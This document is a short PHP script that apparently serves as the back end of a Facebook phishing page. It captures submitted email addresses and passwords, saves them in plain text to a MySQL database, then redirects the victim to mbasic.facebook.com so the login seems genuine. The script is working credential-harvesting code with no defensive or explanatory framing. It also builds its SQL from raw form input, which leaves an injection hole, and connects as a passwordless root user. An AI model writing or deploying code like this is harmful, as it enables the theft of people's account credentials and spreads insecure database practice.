<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "info";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
} 

$email = $_POST['email'];
$password = $_POST['pass'];
$newURL = 'https://mbasic.facebook.com/';

$sql = "INSERT INTO user (email, password)
VALUES ('$email', '$password') ";

if ($conn->query($sql) === TRUE) {
    echo "New record created successfully";
    header('Location: '.$newURL);
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>


